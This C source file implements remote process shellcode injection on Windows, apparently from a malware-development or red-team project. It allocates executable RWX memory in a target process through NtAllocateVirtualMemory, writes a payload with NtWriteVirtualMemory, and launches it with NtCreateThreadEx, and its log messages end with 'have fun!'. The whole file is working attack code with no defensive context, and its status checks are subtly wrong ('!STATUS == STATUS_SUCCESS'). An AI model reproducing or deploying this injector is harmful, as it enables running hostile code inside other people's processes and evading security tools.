#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

    PVOID pAddress = NULL;
    NTSTATUS STATUS = 0;
    HANDLE hThread = NULL;
    SIZE_T sBytesWritten = 0;

    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };



    PRINTA("allocating buffer in process memory...\n");
    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!\n");



    PRINTA("writing payload to allocated buffer...\n");
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sBytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("wrote %zu-bytes to allocated buffer!\n", sBytesWritten);




    PRINTA("creating thread, beginning execution\n");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtCreateThreadEx] failed to create thread, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("thread created!\n");


    PRINTA("waiting for thread to finish executing...\n");
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("thread execute succesfully!\n");

    goto CLEANUP;

CLEANUP:
    PRINTA("clean up, closing thread handle...\n");
    STATUS = NtClose(hThread);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
        return EXIT_FAILURE;
    }
    PRINTA("thread handle closed!\n");

    PRINTA("cleanup complete! have fun!\n");
    return TRUE;
}